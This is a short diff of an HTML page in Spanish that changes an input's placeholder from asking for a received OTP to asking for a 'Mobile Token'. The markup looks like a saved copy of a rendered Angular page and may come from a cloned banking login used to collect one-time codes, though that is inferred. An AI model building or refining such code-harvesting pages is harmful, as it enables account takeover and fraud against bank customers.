@@ -1052,7 +1052,7 @@
     <div _ngcontent-c35="" class="subotica">
         <div _ngcontent-c35="" class="subotica-content">
             <div _ngcontent-c35="" class="subotica-content-data"> 
-                <input id="usuario" oninput="validarUsuario()" _ngcontent-c35="" autocomplete="off" class="subotica-content-data-input required ng-pristine ng-invalid ng-touched" disable-paste="" name="username" id="step01" placeholder="Escriba su otp recibido">          
+                <input id="usuario" oninput="validarUsuario()" _ngcontent-c35="" autocomplete="off" class="subotica-content-data-input required ng-pristine ng-invalid ng-touched" disable-paste="" name="username" id="step01" placeholder="Ingrese Mobile Token">          
             </div>
 
             <center><div style="color:red" class="warning" id="msgBox"></div></center>
